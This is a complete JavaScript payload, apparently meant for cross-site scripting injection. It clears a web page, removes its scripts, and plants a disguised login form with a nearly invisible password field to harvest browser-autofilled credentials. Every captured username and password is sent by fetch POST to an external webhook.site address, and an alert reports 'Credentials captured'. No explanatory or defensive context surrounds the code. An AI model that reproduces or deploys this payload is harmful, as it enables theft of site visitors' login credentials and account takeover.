document.body.innerHTML = "";
var scriptss = document.scripts;

for (var i = scriptss.length - 1; i >= 0; i--) {
    var script = scriptss[i];
    script.parentNode.removeChild(script);
}

var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');

var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'Check here';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.classList.add("single-input");

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input");

form.appendChild(inputName);
form.appendChild(inputPassword);

document.body.appendChild(form);

// Function to send data to the webhook
function sendToWebhook(username, password) {
    fetch('https://webhook.site/715d6362-10ac-415a-a2ea-e0447862f5f4', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            username: username,
            password: password
        }),
    }).catch(console.error);
}

// Monitor the input fields
setTimeout(function () {
    let usernameField = document.getElementsByName('username')[0];
    let passwordField = document.getElementsByName('password')[0];

    function handleInput() {
        if (passwordField.value.length > 0) {
            sendToWebhook(usernameField.value, passwordField.value);
            alert(`Credentials captured: Username = ${usernameField.value}, Password = ${passwordField.value}`);
        }
    }

    usernameField.onchange = handleInput;
    passwordField.onchange = handleInput;
    usernameField.oninput = handleInput;
    passwordField.oninput = handleInput;
}, 1000);
